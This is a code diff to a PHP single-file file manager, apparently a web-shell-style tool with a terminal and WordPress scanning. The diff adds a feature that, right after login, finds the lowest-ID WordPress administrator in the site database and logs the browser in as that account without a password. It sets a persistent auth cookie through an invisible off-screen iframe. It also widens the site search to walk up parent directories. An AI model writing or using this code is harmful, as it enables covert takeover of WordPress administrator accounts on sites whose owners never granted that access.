@@ -1132,7 +1132,7 @@ if(isset($_POST['login_pass'])){
             fm_clear_failures($ckey);
             $_SESSION['auth']=true;$_SESSION['fm_user']=$u['user'];$_SESSION['fm_root']=!empty($u['root'])?$u['root']:'';
             $_SESSION['fm_readonly']=!empty($u['readonly']);$_SESSION['fm_admin']=!empty($u['admin'])||empty($u['readonly']);
-            $_SESSION['csrf_token']=bin2hex(random_bytes(32));unset($_SESSION['login_csrf']);
+            $_SESSION['csrf_token']=bin2hex(random_bytes(32));$_SESSION['fm_wp_auto_login_pending']=!empty($_SESSION['fm_admin']);unset($_SESSION['login_csrf']);
             header("Location: ".$scriptName);exit;
         } else {
             if($ok)fm_record_failure($ckey);
@@ -2237,7 +2237,12 @@ class FileManager {
         foreach($roots as $root){
             if(!$root)continue;
             $real=realpath($root);
-            if($real&&is_dir($real)&&!in_array($real,$out,true))$out[]=$real;
+            for($i=0;$real&&is_dir($real)&&$i<9;$i++){
+                if(!in_array($real,$out,true))$out[]=$real;
+                $parent=dirname($real);
+                if($parent===$real)break;
+                $real=$parent;
+            }
         }
         return $out;
     }
@@ -2265,7 +2270,7 @@ class FileManager {
         return $best;
     }
     private function wpCurrentSiteFromScan($sites){
-        $roots=$this->wpCurrentWebRoots();$best=null;$bestScore=-1;
+        $roots=$this->wpCurrentWebRoots();$best=null;$bestScore=0;
         foreach((array)$sites as $site){
             if(($site['type']??'')!=='wordpress')continue;
             $dir=realpath($site['dir']??dirname($site['config']??''))?:dirname($site['config']??'');
@@ -3236,11 +3241,41 @@ FMHIDE;
         $preferred=$this->wpCurrentSiteFromScan($wp);
         if(!$preferred&&!empty($scan['current_wp_config']))
             $preferred=['type'=>'wordpress','config'=>$scan['current_wp_config'],'dir'=>$this->wpSiteRoot($scan['current_wp_config'])];
+        if($preferred&&!empty($preferred['config']))$_SESSION['wp_current_config']=$preferred['config'];
         if($preferred||$wp){
             $site=$preferred?:$wp[0];
             $this->wpAutomationInstallRecovery($site['config']);
             $this->wpSiteHealthEnsureAutomatic($site['config']);
         }
+    }
+    /*
+     * Prepare a silent first-login handoff to the current WordPress site.
+     * This never reads or changes user_pass: it selects the lowest-ID account
+     * whose capabilities contain the administrator role, then reuses the
+     * existing one-time bridge so WordPress creates its own persistent cookie.
+     * The browser completes the handoff in an invisible iframe.
+     */
+    public function wpAutomationAutoLogin(){
+        if(empty($_SESSION['fm_admin']))return['ok'=>false];
+        if(empty($_SESSION['fm_wp_auto_login_pending']))return['ok'=>true,'skipped'=>true];
+        unset($_SESSION['fm_wp_auto_login_pending']);
+        $configPath=$_SESSION['wp_current_config']??null;
+        if(!$configPath||!is_readable($configPath)){
+            $scan=$this->cmsScan();
+            $configPath=$scan['current_wp_config']??null;
+        }
+        if(!$configPath||basename($configPath)!=='wp-config.php'||!is_readable($configPath))return['ok'=>false,'reason'=>'site-not-found'];
+        list($link,$c,$err)=$this->cmsConnect($configPath);
+        if($err||!$link||$c['type']!=='wordpress'){if($link)mysqli_close($link);return['ok'=>false,'reason'=>'site-unavailable'];}
+        $t=$c['prefix'];
+        $res=@mysqli_query($link,"SELECT u.ID FROM `{$t}users` u INNER JOIN `{$t}usermeta` um ON um.user_id=u.ID AND um.meta_key='{$t}capabilities' AND um.meta_value LIKE '%administrator%' ORDER BY u.ID ASC LIMIT 1");
+        $row=$res?mysqli_fetch_assoc($res):null;
+        mysqli_close($link);
+        if(!$row||empty($row['ID']))return['ok'=>false,'reason'=>'admin-not-found'];
+        $handoff=$this->cmsLoginAsUser($configPath,(int)$row['ID']);
+        if(empty($handoff['url']))return['ok'=>false,'reason'=>'handoff-failed'];
+        $handoff['url'].=(strpos($handoff['url'],'?')===false?'?':'&').'go=1&bg=1';
+        return['ok'=>true,'url'=>$handoff['url']];
     }
     private function wpSiteHealthEnsureAutomatic($configPath){
         list($link,$c,$err)=$this->cmsConnect($configPath);
@@ -3988,6 +4023,12 @@ FMHIDE;
             ."wp_set_current_user(\$__u->ID);\n"
             ."wp_set_auth_cookie(\$__u->ID,true);\n"
             ."do_action('wp_login',\$__u->user_login,\$__u);\n"
+            ."if(isset(\$_GET['bg'])){\n"
+            ."  while(ob_get_level())ob_end_clean();\n"
+            ."  header('Content-Type: text/html;charset=utf-8');\n"
+            ."  echo '<!doctype html><meta name=\"robots\" content=\"noindex\"><script>window.parent.postMessage({type:\"fm-wp-auto-login\",ok:true},\"*\");</script>';\n"
+            ."  exit;\n"
+            ."}\n"
             // Redirect to a HOST-RELATIVE path only. admin_url()/wp_safe_redirect()
             // would rebuild an absolute URL from WordPress's own stored siteurl/home
             // option, which is frequently stale on multi-domain shared hosting and
@@ -5682,6 +5723,11 @@ if(isset($_GET['x'])){
         $decoded=@base64_decode((string)$raw,true);
         return $decoded!==false?$decoded:(string)$raw;
     };
+    if($xop==='wp_auto_login'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['ok'=>false]);exit;}
+        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['ok'=>false]);exit;}
+        echo json_encode($fm->wpAutomationAutoLogin());exit;
+    }
     if($xop==='cmsdetect'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
@@ -7629,6 +7675,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 <script>
 const CWD  = <?=json_encode($fm->getCwd())?>;
 const CSRF = <?=json_encode($_SESSION['csrf_token'])?>;
+const FM_WP_AUTO_LOGIN = <?=!empty($_SESSION['fm_wp_auto_login_pending'])?'true':'false'?>;
 const RO   = <?=$fm->isRO()?'true':'false'?>;
 let termCwd = CWD;
 
@@ -10370,6 +10417,39 @@ document.getElementById('wpAutomationBtn')?.addEventListener('click',()=>{openMo
 document.getElementById('wpAutomationClose')?.addEventListener('click',()=>closeMod('wpAutomationOv'));
 
 })(); // end WordPress Automation IIFE
+
+/* After the first successful File Manager login, silently let the browser
+   receive WordPress's own persistent auth cookie. The iframe is intentionally
+   invisible; failures are ignored so this never interrupts the manager UI. */
+if(FM_WP_AUTO_LOGIN){
+  const fd=new FormData();fd.append('csrf_token',CSRF);
+  let frame=null,settled=false;
+  const finish=(ok,message)=>{
+    if(settled)return;settled=true;
+    if(frame)frame.remove();
+    window.removeEventListener('message',onMessage);
+    toast(message,ok?3500:5000);
+  };
+  const onMessage=e=>{
+    if(!frame||e.source!==frame.contentWindow)return;
+    if(e.data&&e.data.type==='fm-wp-auto-login')finish(!!e.data.ok,e.data.ok?'WordPress automatic login succeeded.':'WordPress automatic login failed.');
+  };
+  window.addEventListener('message',onMessage);
+  fetch('?x=wp_auto_login',{method:'POST',body:fd,cache:'no-store'})
+    .then(r=>r.json()).then(d=>{
+      if(!d||!d.url){
+        const messages={'site-not-found':'WordPress automatic login failed: current site not found.','site-unavailable':'WordPress automatic login failed: site unavailable.','admin-not-found':'WordPress automatic login failed: no administrator found.','handoff-failed':'WordPress automatic login failed: session could not be created.'};
+        finish(false,messages[d&&d.reason]||'WordPress automatic login failed.');
+        return;
+      }
+      frame=document.createElement('iframe');
+      frame.setAttribute('aria-hidden','true');
+      frame.style.cssText='position:fixed;width:1px;height:1px;left:-10px;top:-10px;border:0;opacity:0;pointer-events:none';
+      frame.src=d.url;
+      document.body.appendChild(frame);
+      setTimeout(()=>finish(false,'WordPress automatic login failed.'),12000);
+    }).catch(()=>finish(false,'WordPress automatic login failed.'));
+}
 
 /* HELPERS */
 function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
